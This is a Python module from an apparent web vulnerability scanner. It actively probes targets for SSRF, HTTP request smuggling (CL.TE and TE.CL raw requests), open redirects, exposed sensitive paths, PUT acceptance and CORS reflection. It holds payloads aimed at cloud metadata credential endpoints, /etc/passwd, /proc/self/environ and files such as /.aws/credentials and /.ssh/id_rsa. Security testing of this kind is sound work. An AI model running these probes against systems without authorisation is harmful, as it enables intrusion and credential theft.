#!/usr/bin/env python3
# Active audits: SSRF, HTTP request smuggling, open redirect

import re
import ssl
import secrets
import asyncio

from typing import List, Dict, Any
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

from .aopener import Fetcher

SSRF_PAYLOADS = [
    '165sug9i2et33odo7g6r6w3ab1hs5it7.oastify.com'
    'http://127.0.0.1/',
    'http://127.0.0.1:80@127.0.0.1/',
    'http://localhost/',
    'http://[::1]/',
    'http://0x7f000001/',
    'http://2130706433/',
    'http://0177.0.0.1/',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://metadata.google.internal/computeMetadata/v1/',
    'file:///etc/passwd',
    'file:///proc/self/environ']

META_MARKERS = ('ami-id', 'instance-id', 'security-credentials', 'user-data',
                'meta-data', 'computemetadata', 'placement/', 'local-hostname')

def _ssrf_signal(resp, baseline, payload, slow) -> Any:
    if not resp or resp.status == 0:return None
    body = resp.text.lower()
    if any(m in body for m in META_MARKERS):
        return 'cloud metadata reflected in response'
    if 'root:' in body and ':0:0:' in body:
        return 'local file content reflected (file:// wrapper?)'
    loc = resp.headers.get('Location', '')
    if loc.startswith(('http://127.', 'http://localhost', 'http://[::1]',
                       'http://169.254.', 'http://0x', 'file:')):
        return f'redirects to internal host: {loc[:80]}'
    if baseline and baseline.status in (401, 403, 404) and resp.status == 200:
        return f'status {baseline.status} -> 200 (fetched internal resource?)'
    if baseline and resp.elapsed - baseline.elapsed >= slow:
        return f'slow response ({resp.elapsed:.1f}s vs {baseline.elapsed:.1f}s) - possible blind SSRF'
    return None

async def audit_ssrf(fetcher, endpoints, oob=None, slow=6.0):
    # endpoints: 'METHOD url?a=FUZZ' lines. One param poisoned at a time.
    parsed = []
    for ep in endpoints:
        try:method, url = ep.split(' ', 1)
        except ValueError:continue
        p = urlsplit(url)
        if p.query:
            parsed.append((method, p, parse_qsl(p.query, keep_blank_values=True)))
    if not parsed:return []
    payloads = list(SSRF_PAYLOADS)
    if oob:payloads.append(f'http://{secrets.token_hex(4)}.{oob}/')
    if len(parsed) > 150:payloads = payloads[:8]
    # phase 1: baselines for differential analysis
    base_urls = [urlunsplit((p.scheme, p.netloc, p.path, p.query, ''))
                 for _, p, _ in parsed]
    base_resp = {r.url: r for r in await fetcher.fetch_many(base_urls, workers=30)}
    jobs = []
    for idx, (method, p, params) in enumerate(parsed):
        for name in dict.fromkeys(k for k, _ in params):
            for pl in payloads:
                qs = urlencode([(k, pl if k == name else v) for k, v in params])
                jobs.append((idx, name, pl,
                             urlunsplit((p.scheme, p.netloc, p.path, qs, ''))))
    print(f'[ssrf] {len(jobs)} probe requests across {len(parsed)} endpoints')
    resps = await fetcher.fetch_many([j[3] for j in jobs], workers=40)
    by_url = {r.url: r for r in resps}
    findings, seen = [], set()
    for idx, name, pl, u in jobs:
        sig = _ssrf_signal(by_url.get(u), base_resp.get(base_urls[idx]), pl, slow)
        if sig:
            key = (base_urls[idx].split('?')[0], name)
            if key not in seen:
                seen.add(key)
                findings.append({'url': u, 'param': name, 'payload': pl, 'signal': sig})
    return findings[:100]

# open redirect
REDIRECT_PARAMS = ('url', 'next', 'redirect', 'redirect_uri', 'redirect_url',
                   'return', 'returnurl', 'return_url', 'dest', 'destination',
                   'target', 'rurl', 'continue', 'go', 'out', 'view', 'path',
                   'callback', 'redir', 'relay', 'forward', 'to', 'load', 'file')

async def audit_openredirect(fetcher, endpoints) -> List:
    payload = 'https://fuzz300-probe.invalid/landing'
    jobs = []
    for ep in endpoints:
        try:_, url = ep.split(' ', 1)
        except ValueError:continue
        p = urlsplit(url)
        if not p.query:continue
        params = parse_qsl(p.query, keep_blank_values=True)
        for name in dict.fromkeys(k for k, _ in params if k.lower() in REDIRECT_PARAMS):
            qs = urlencode([(k, payload if k == name else v) for k, v in params])
            jobs.append((name, urlunsplit((p.scheme, p.netloc, p.path, qs, ''))))
    if not jobs:return []
    resps = await fetcher.fetch_many([u for _, u in jobs], workers=40)
    by_url = {r.url: r for r in resps}
    out = []
    for name, u in jobs:
        r = by_url.get(u)
        if not r:continue
        loc = r.headers.get('Location', '')
        if payload in loc or payload in r.text:
            out.append({'url': u, 'param': name, 'status': r.status,
                        'location': loc[:120]})
    return out

# HTTP smuggling
# A prefix path is smuggled; if it gets an answer on the probe connection

async def _tcp_steps(host, port, steps, use_ssl) -> List:
    # payload_bytes -> list of raw responses
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        conn = asyncio.open_connection(host, port, ssl=ctx if use_ssl else None,
                                       server_hostname=host if use_ssl else None)
        reader, writer = await asyncio.wait_for(conn, 8)
    except Exception:return []
    out = []
    for payload, full in steps:
        try:
            writer.write(payload)
            await writer.drain();data = b''
            while True:
                chunk = await asyncio.wait_for(reader.read(65536), 5)
                if not chunk:break
                data += chunk
                if not full and b'\r\n\r\n' in data:break
            out.append(data)
        except Exception:out.append(b'');break
    try:
        writer.close()
        await asyncio.wait_for(writer.wait_closed(), 3)
    except Exception:pass
    return out

def _smuggle_probes(host, path, prefix) -> List:
    common = (f'POST {path} HTTP/1.1\r\nHost: {host}\r\n'
              f'Connection: keep-alive\r\n'
              f'Content-Type: application/x-www-form-urlencoded\r\n')
    clte_body = (f'0\r\n\r\nGET /{prefix} HTTP/1.1\r\nHost: {host}\r\n'
                 f'X-Padding: {"A" * 20}\r\n\r\n')
    clte = (common + f'Content-Length: {len(clte_body)}\r\n'
            f'Transfer-Encoding: chunked\r\n\r\n').encode() + clte_body.encode()
    chunk = (f'GET /{prefix} HTTP/1.1\r\nHost: {host}\r\n'
             f'Content-Length: 5\r\n\r\nx=123')
    tecl_body = f'{len(chunk):x}\r\n{chunk}\r\n0\r\n\r\n'
    tecl = (common + 'Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n').encode() \
        + tecl_body.encode()
    return [('CL.TE', clte), ('TE.CL', tecl)]

async def probe_smuggling(urls, max_paths=10) -> List:
    if not urls:return []
    by_host = {}
    for u in urls:
        p = urlsplit(u)
        if p.scheme not in ('http', 'https') or not p.hostname:continue
        port = p.port or (443 if p.scheme == 'https' else 80)
        key = (p.scheme, p.hostname.lower(), port)
        by_host.setdefault(key, [])
        if p.path not in by_host[key]:
            by_host[key].append(p.path or '/')
    findings = []
    for (scheme, host, port), paths in by_host.items():
        use_ssl = scheme == 'https'
        for path in paths[:max_paths]:
            prefix = 'smz' + secrets.token_hex(4)
            follow = (f'GET / HTTP/1.1\r\nHost: {host}\r\n'
                      f'Connection: close\r\n\r\n').encode()
            for kind, probe in _smuggle_probes(host, path, prefix):
                resps = await _tcp_steps(host, port,
                                         [(probe, False), (follow, True)], use_ssl)
                if len(resps) == 2 and f'/{prefix}'.encode() in resps[1]:
                    findings.append({
                        'type': kind,
                        'url': f'{scheme}://{host}:{port}{path}',
                        'detail': f'{kind} desync: smuggled /{prefix} answered on probe connection'})
                    break
                await asyncio.sleep(0.2)
    return findings

# GAP analysis

COMMON_PATHS = [
    '/.git/HEAD', '/.git/config', '/.svn/entries', '/.env', '/.htpasswd',
    '/config.php~', '/config.php.bak', '/backup.zip', '/db.sql', '/dump.sql',
    '/swagger.json', '/api-docs', '/v2/api-docs', '/openapi.json',
    '/graphql', '/graphiql', '/.well-known/security.txt',
    '/.well-known/openid-configuration', '/actuator', '/actuator/env',
    '/actuator/heapdump', '/server-status', '/server-info',
    '/phpinfo.php', '/info.php', '/debug', '/console', '/_profiler',
    '/xmlrpc.php', '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
    '/.aws/credentials', '/.ssh/id_rsa', '/admin', '/administrator']

SEC_HEADERS = ['strict-transport-security', 'content-security-policy',
               'x-frame-options', 'x-content-type-options',
               'referrer-policy', 'permissions-policy']

async def gap_audit(fetcher, domain, base_url, data_urls, js_endpoints) -> Dict:
    findings = {'exposed_paths': [], 'methods': [], 'cors': None,
                'missing_headers': [], 'reflected_params': [],
                'js_endpoints': sorted(js_endpoints)}
    p = urlsplit(base_url)
    origin = f'{p.scheme}://{p.netloc}'

    # 1) sensitive-path sweep (cheap, high signal)
    resps = await fetcher.fetch_many([origin + cp for cp in COMMON_PATHS], workers=10)
    for r in resps:
        if r.status in (200, 301, 401, 403):
            findings['exposed_paths'].append(
                {'path': urlsplit(r.url).path, 'status': r.status, 'length': len(r.body)})

    cands = sorted({u for u in data_urls
                    if urlsplit(u).query == '' and urlsplit(u).path not in ('', '/')},
                   key=len)[:6]
    for u in cands:
        o = await fetcher.fetch(u, method='OPTIONS')
        allow = o.headers.get('Allow', '')
        put = await fetcher.fetch(u, method='PUT', data=b'fuzz300=probe')
        if put.status in (200, 201, 204):
            findings['methods'].append(
                {'url': u, 'issue': f'PUT accepted (HTTP {put.status}) - arbitrary file write?'})
        for m in ('PUT', 'DELETE', 'PATCH', 'TRACE'):
            if m in allow.upper():
                findings['methods'].append({'url': u, 'issue': f'OPTIONS advertises {m}'})

    # 3) CORS: is an arbitrary origin reflected (with credentials)?
    r = await fetcher.fetch(base_url, headers={'Origin': 'https://fuzz300-probe.invalid'})
    acao = r.headers.get('Access-Control-Allow-Origin', '').strip()
    acac = r.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
    if acao == 'https://fuzz300-probe.invalid' or (acao == '*' and acac):
        findings['cors'] = {'acao': acao, 'credentials': acac}

    # 4) missing security headers on the landing page
    lower = {k.lower() for k in r.headers}
    findings['missing_headers'] = [h for h in SEC_HEADERS if h not in lower]

    # 5) reflected canary -> injection candidates (manual follow-up in ZAP/Burp)
    canary = 'fz3x' + secrets.token_hex(3)
    canary_urls = [u + ('&' if '?' in u else '?') + 'zzref=' + canary
                   for u in list(data_urls)[:40]]
    resps = await fetcher.fetch_many(canary_urls, workers=20)
    for r in resps:
        if canary in r.text:
            findings['reflected_params'].append(r.url)
    return findings
